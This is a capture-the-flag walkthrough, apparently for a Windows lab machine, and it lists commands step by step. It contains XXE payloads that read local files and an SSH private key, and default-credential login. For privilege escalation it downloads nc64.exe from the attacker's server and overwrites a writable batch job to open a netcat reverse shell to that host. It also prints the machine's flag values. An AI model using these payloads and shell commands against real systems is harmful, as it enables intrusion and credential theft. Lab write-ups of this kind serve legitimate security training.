@@ -1,0 +1,105 @@
+We start with our nmap scan: sudo nmap -sC -sV -p- --min-rate 9000 (target ip)
+
+We get three open ports:22,80 and 443, and since we can't encouter the ssh, let us see what website is running on port 80.
+
+We visit this website and we see that it is a log in page with username and password required. We will try to run dirbuster and see what we are going to get.
+
+Dirbuster doesnt come up with very useful info. However, we notice that this login page has a cookie set up which means we can try to use sqlmap tool against it.
+
+sqlmap -u 'http://(target ip)/' --data="username=admin&password=sdafsd" --cookie="PHPSESSID=(cookie)" --level 5 --risk 3 --ignore-code 401 -f --banner --dbms='mysql'
+
+However, the solution is simpler than we expected and by trying differnet default credentials, we can login using admin:passowrd.
+
+We will use BurbSuite for this part. In the order tab, we will put some text in the quantity and address and we will capture the traffic of this page after clicking submit.
+
+We will send the POST request that we captured to the Repeater
+
+
+We will first search for XXE or XEE payload cheat sheets. This will lead us to a HackTricks article about this topic. 
+
+We will use the following payload:<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+<data>&example;</data> .
+
+Since the website is running on a Windows machine, we will change the file directory to:'file:///c:/windows/win.ini' .
+
+So the whole payload becomes: <?xml version = "1.0"?>
+<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///c:windows/win.ini">]>
+<order><quantity>3</quantity><item>&example;</item><address>add1</address></order>
+
+Note: the word between the item tags must match the word after ENTITY. For this case, the word was example.
+
+If we clicked send, we will see the content of the file. This means this website is vulnerable to XEE attacks.
+
+Back in the website, in the products tab, if we inspected this page, we will find a useful clue. The name of the developer:Daniel. This can be useful as this person can be one of the users.
+
+We will change the payload to the following: <?xml version = "1.0"?>
+<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///c:users/daniel/desktop/user.txt">]>
+<order><quantity>3</quantity><item>&example;</item><address>add1</address></order>.
+
+This will give us the user flag.
+
+User flag:032d2fc8952a8c24e39c8f0ee9918ef7.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Privilege Escalation:
+
+Now, we know that we can see the content of files that we have privileges to view. 
+
+If we searched on Google for where we can find ssh key in windows files, we find out that we can see the ssh under user/.ssh/id_rsa. 
+
+Indeed if we changed the file directory to :file:///C:/users/daniel/.ssh/id_rsa, we will see the ssh key for the user Danile.
+
+We will copy this ssh and keep it in a text file. 
+
+To make this file work, we first need to install puttygen. This tool will convert the ssh we copied to Openssh format.
+
+We use the tool like so: puttygen id_rsa -O private-openssh -o id_rsa.conv .
+
+Change the permission for the id_rsa.conv file: chmod 600 id_rsa.conv
+
+Login to the target machine like so: ssh -i id_rsa.conv daniel@(target ip) .
+
+
+ We are in.
+
+ We can list the privileges that daniel have by: whoami /priv. Non of the privileges is useful.
+
+ We will see what C directory contain.
+
+We find that directory C has a directory called Log-Management. This might be useful so we see what is inside it.
+
+It has a file called job.bat. If we view what this file contains: type job.bat, we will see that this file is responsible for clearing the Event Logs.
+
+Since the file itself can only be run by an Administrator, we could try our luck and see if our usergroup could
+at least edit the file, instead of running it, or if there are any mismatched permissions between the script
+and the usergroup or file configuration. We can achieve this by using the icacls command.
+
+Looking at the permissions of job.bat using icacls reveals that the group BUILTIN\Users has full
+control (F) over the file. The BUILTIN\Users group represents all local users, which includes Daniel as
+well. We might be able to get a shell by transferring netcat to the system and modifying the script to
+execute a reverse shell.
+
+Because the target host does not have access to the Internet, we will need to deliver the nc64.exe
+executable through our own connection with the target. In order to do so, we will first need to download
+nc64.exe on our system, start up a Python HTTP server on one of our ports, then switch to the shell we
+have on the host to issue a wget command with our address and the nc64.exe file residing on our server.
+This will initialize a download from the host to our Python server for the executable. Make sure you don't
+switch folders after downloading the executable. The Python HTTP server needs to be running in the same
+directory as the location of the downloaded nc64.exe file we want to deliver to the target.
+In order to download the executable on our system, we can use this link: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+
+We will upload the nc64.exe file by initializing a simple http server on our machine using python: python3 -m http.server 80.
+
+We will do the following on the target machine: wget http://(our ip)/nc64.exe -outfile nc64.exe.
+
+We need to run netcat to listen on a port of our choice: nc -nvlp 1234
+
+Since we have full control over the job.bat script, we will modify its' contents by running the following
+command:echo C:\Log-Management\nc64.exe -e cmd.exe (our ip) (port number) > C:\Log-Management\job.bat
+
+If we turned back to our netcat, we will see that we have a reverse shell as Administrator.
+  
+root flag:f574a3e7650cebd8c39784299cb570f8
+
+//END
